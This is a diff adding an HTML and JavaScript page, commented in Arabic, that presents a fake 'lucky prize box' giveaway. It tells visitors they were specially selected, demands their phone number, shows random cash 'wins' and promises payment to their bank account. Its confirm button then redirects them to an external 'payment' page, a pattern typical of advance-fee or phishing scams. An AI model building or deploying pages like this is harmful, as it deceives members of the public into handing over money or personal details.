@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lucky Prize Box Selection</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 900px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            color: #FFD700;
+        }
+        
+        .header p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+        
+        .phone-input {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .phone-input h3 {
+            color: #FFD700;
+            margin-bottom: 15px;
+        }
+        
+        .phone-input input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.9);
+            margin-bottom: 10px;
+        }
+        
+        .phone-input input:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.5);
+        }
+        
+        .phone-input p {
+            font-size: 0.9rem;
+            color: #FF6B6B;
+            margin-top: 5px;
+        }
+        
+        .attempts-left {
+            font-size: 1.4rem;
+            color: #FFD700;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .prizes-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 30px 0;
+            width: 100%;
+        }
+        
+        .prize-box {
+            width: 150px;
+            height: 180px;
+            perspective: 1000px;
+            cursor: pointer;
+        }
+        
+        .prize-box-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.8s;
+            transform-style: preserve-3d;
+        }
+        
+        .prize-box.flipped .prize-box-inner {
+            transform: rotateY(180deg);
+        }
+        
+        .prize-box-front, .prize-box-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-box-front {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            border: 5px solid #ffd700;
+        }
+        
+        .prize-box-front i {
+            font-size: 3rem;
+            color: #6a11cb;
+            margin-bottom: 15px;
+        }
+        
+        .prize-box-front h3 {
+            color: #333;
+            font-weight: bold;
+        }
+        
+        .prize-box-back {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            transform: rotateY(180deg);
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .prize-amount {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ffd700;
+            margin: 10px 0;
+        }
+        
+        .result {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 1.5rem;
+            min-height: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            width: 100%;
+        }
+        
+        .result-amount {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
+            margin: 10px 0;
+        }
+        
+        .instructions {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .instructions h2 {
+            color: #FFD700;
+            margin-bottom: 15px;
+        }
+        
+        .instructions ol {
+            text-align: left;
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+        }
+        
+        .collect-button {
+            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.4rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .collect-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, #66BB6A 0%, #388E3C 100%);
+        }
+        
+        .money-sticker {
+            font-size: 2rem;
+            animation: bounce 2s infinite;
+        }
+        
+        /* نافذة التأكيد */
+        .confirmation-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #1a2a6c, #2575fc);
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            border: 3px solid #ffd700;
+        }
+        
+        .modal-content h2 {
+            color: #ffd700;
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        
+        .modal-content p {
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+        }
+        
+        .modal-btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .confirm-btn {
+            background: linear-gradient(135deg, #4CAF50, #2E7D32);
+            color: white;
+        }
+        
+        .confirm-btn:hover {
+            background: linear-gradient(135deg, #66BB6A, #388E3C);
+            transform: translateY(-3px);
+        }
+        
+        .cancel-btn {
+            background: linear-gradient(135deg, #f44336, #d32f2f);
+            color: white;
+        }
+        
+        .cancel-btn:hover {
+            background: linear-gradient(135deg, #ef5350, #e53935);
+            transform: translateY(-3px);
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @media (max-width: 768px) {
+            .prizes-container {
+                gap: 15px;
+            }
+            
+            .prize-box {
+                width: 130px;
+                height: 160px;
+            }
+            
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            
+            .collect-button {
+                padding: 15px 30px;
+                font-size: 1.2rem;
+            }
+            
+            .modal-buttons {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-crown"></i> For Our Valued Customers</h1>
+            <p>You have been selected for a special prize! Choose two boxes to reveal your rewards.</p>
+        </div>
+        
+        <div class="phone-input">
+            <h3><i class="fas fa-phone"></i> Enter Your Phone Number</h3>
+            <input type="tel" id="phoneNumber" placeholder="Enter your phone number here">
+            <p>We need your phone number to contact you for prize delivery</p>
+        </div>
+            
+        <div class="attempts-left" id="attemptsLeft">Attempts left: 2</div>
+        
+        <div class="prizes-container" id="prizesContainer">
+            <!-- سيتم إضافة الصناديق ديناميكياً -->
+        </div>
+        
+        <div class="result" id="result">
+            <div>Select a box to reveal your prize!</div>
+        </div>
+        
+        <div class="instructions">
+            <h2><i class="fas fa-info-circle"></i> How to Play</h2>
+            <ol>
+                <li>Enter your phone number above</li>
+                <li>You have 2 attempts to choose two boxes</li>
+                <li>Click on any box to open it and see the prize inside</li>
+                <li>The prize you will receive is the highest value from the two selected boxes</li>
+                <li>Click "Collect Money" to claim your prize</li>
+            </ol>
+        </div>
+        
+        <button class="collect-button" id="collectButton">
+            <span class="money-sticker">💰</span> 
+            COLLECT MONEY
+            <span class="money-sticker">💵</span>
+        </button>
+    </div>
+
+    <!-- نافذة التأكيد -->
+    <div class="confirmation-modal" id="confirmationModal">
+        <div class="modal-content">
+            <h2><i class="fas fa-check-circle"></i> Confirm Prize Collection</h2>
+            <p>By clicking "OK", the following prize will be sent to your bank account:</p>
+            <div class="result-amount" id="modalPrizeAmount">$0</div>
+            <p>Make sure your phone number is correct for verification purposes.</p>
+            <div class="modal-buttons">
+                <button class="modal-btn confirm-btn" id="confirmButton">OK</button>
+                <button class="modal-btn cancel-btn" id="cancelButton">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const prizesContainer = document.getElementById('prizesContainer');
+            const attemptsLeftElement = document.getElementById('attemptsLeft');
+            const resultElement = document.getElementById('result');
+            const collectButton = document.getElementById('collectButton');
+            const phoneInput = document.getElementById('phoneNumber');
+            const confirmationModal = document.getElementById('confirmationModal');
+            const modalPrizeAmount = document.getElementById('modalPrizeAmount');
+            const confirmButton = document.getElementById('confirmButton');
+            const cancelButton = document.getElementById('cancelButton');
+            
+            let attemptsLeft = 2;
+            let selectedPrizes = [];
+            let gameEnded = false;
+            let maxPrize = 0;
+            
+            // الجوائز المتاحة
+            const prizes = [1000, 500, 100, 50, 10];
+            
+            // ترتيب الجوائز عشوائياً
+            function shufflePrizes() {
+                for (let i = prizes.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [prizes[i], prizes[j]] = [prizes[j], prizes[i]];
+                }
+            }
+            
+            // إنشاء الصناديق مع الجوائز العشوائية
+            function createBoxes() {
+                shufflePrizes();
+                prizesContainer.innerHTML = '';
+                
+                prizes.forEach((prize, index) => {
+                    const box = document.createElement('div');
+                    box.className = 'prize-box';
+                    box.setAttribute('data-prize', prize);
+                    
+                    box.innerHTML = `
+                        <div class="prize-box-inner">
+                            <div class="prize-box-front">
+                                <i class="fas fa-gift"></i>
+                                <h3>Box ${index + 1}</h3>
+                            </div>
+                            <div class="prize-box-back">
+                                <h3>Prize</h3>
+                                <div class="prize-amount">$${prize}</div>
+                                <p>Congratulations!</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    prizesContainer.appendChild(box);
+                    
+                    // إضافة حدث النقر للصندوق
+                    box.addEventListener('click', () => {
+                        if (gameEnded || box.classList.contains('flipped')) return;
+                        
+                        // التحقق من إدخال رقم الهاتف
+                        if (!phoneInput.value.trim()) {
+                            resultElement.innerHTML = `<div style="color:#ff6b6b">Please enter your phone number first!</div>`;
+                            return;
+                        }
+                        
+                        if (attemptsLeft > 0) {
+                            // قلب الصندوق
+                            box.classList.add('flipped');
+                            
+                            // الحصول على قيمة الجائزة
+                            const prizeValue = parseInt(box.getAttribute('data-prize'));
+                            selectedPrizes.push(prizeValue);
+                            
+                            // تقليل عدد المحاولات
+                            attemptsLeft--;
+                            attemptsLeftElement.textContent = `Attempts left: ${attemptsLeft}`;
+                            
+                            // عرض الجائزة
+                            resultElement.innerHTML = `
+                                <div>You won:</div>
+                                <div class="result-amount">$${prizeValue}</div>
+                                <div>${attemptsLeft > 0 ? 'Choose another box!' : 'No attempts left!'}</div>
+                            `;
+                            
+                            // إذا انتهت المحاولات
+                            if (attemptsLeft === 0) {
+                                gameEnded = true;
+                                maxPrize = Math.max(...selectedPrizes);
+                                
+                                setTimeout(() => {
+                                    resultElement.innerHTML = `
+                                        <div>Your attempts are over!</div>
+                                        <div>The highest prize you won is:</div>
+                                        <div class="result-amount">$${maxPrize}</div>
+                                        <div>Congratulations!</div>
+                                    `;
+                                }, 1500);
+                            }
+                        }
+                    });
+                });
+            }
+            
+            // إنشاء الصناديق أول مرة
+            createBoxes();
+            
+            // زر تحصيل الأموال
+            collectButton.addEventListener('click', () => {
+                if (!phoneInput.value.trim()) {
+                    resultElement.innerHTML = `<div style="color:#ff6b6b">Please enter your phone number to claim your prize!</div>`;
+                    return;
+                }
+                
+                if (selectedPrizes.length === 0) {
+                    resultElement.innerHTML = `<div style="color:#ff6b6b">Please select at least one box first!</div>`;
+                    return;
+                }
+                
+                const prize = attemptsLeft === 0 ? maxPrize : Math.max(...selectedPrizes);
+                
+                // عرض نافذة التأكيد
+                modalPrizeAmount.textContent = `$${prize}`;
+                confirmationModal.style.display = 'flex';
+            });
+            
+            // زر الموافقة في نافذة التأكيد
+            confirmButton.addEventListener('click', () => {
+                // توجيه المستخدم إلى صفحة الدفع
+                window.location.href = 'https://payment0.github.io/pay/';
+            });
+            
+            // زر الإلغاء في نافذة التأكيد
+            cancelButton.addEventListener('click', () => {
+                confirmationModal.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
